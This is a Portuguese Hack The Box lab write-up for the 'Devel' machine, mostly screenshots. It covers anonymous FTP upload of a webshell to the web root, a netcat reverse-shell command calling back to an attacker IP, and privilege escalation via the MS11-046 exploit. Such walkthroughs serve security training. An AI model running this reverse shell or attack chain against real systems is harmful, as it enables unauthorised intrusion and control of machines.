Enumeração de serviços:
![[Write-up/Hack The Box/Devel/img/Pasted image 20240229194557.png]]
O nmap indicou que o FTP está aceitando login com usuário anônimo. Ao acessar o FTP percebemos que é raiz do servidor web, então vamos subir um arquivo de teste:
![[Write-up/Hack The Box/Devel/img/Pasted image 20240229194818.png]]
Acessamos o arquivo pelo navegador:
![[Write-up/Hack The Box/Devel/img/Pasted image 20240229194843.png]]
Deu certo! Vamos então tentar subir uma webshell para o servidor:
![[Write-up/Hack The Box/Devel/img/Pasted image 20240229195338.png]]
![[Write-up/Hack The Box/Devel/img/Pasted image 20240229195302.png]]
Conseguimos executar comando, mas vamos melhorar e trazer a shell do host pelo netcat.
Subimos o nc.exe da máquina atacante para a pasta temporária:
![[Write-up/Hack The Box/Devel/img/Pasted image 20240229195517.png]]
Vamos executa-lo com o comando:
```powershell
C:\WINDOWS\TEMP\nc.exe 10.10.14.9 1234 -e C:\Windows\system32\cmd.exe
```
E pegamos a shell:
![[Write-up/Hack The Box/Devel/img/Pasted image 20240229195644.png]]
![[Write-up/Hack The Box/Devel/img/Pasted image 20240229200113.png]]
Após um tempo de enumeração, identificamos com a ajuda do [Watson](https://github.com/carlospolop/winPE/tree/master/binaries/watson) algumas possíveis vulnerabilidades.
![[Write-up/Hack The Box/Devel/img/Pasted image 20240229205019.png]]
Vamos utilizar a MS11-046 com o exploit: https://www.exploit-db.com/exploits/40564
Ao compilar e executar, escalamos o privilégio:
![[Write-up/Hack The Box/Devel/img/Pasted image 20240229205202.png]]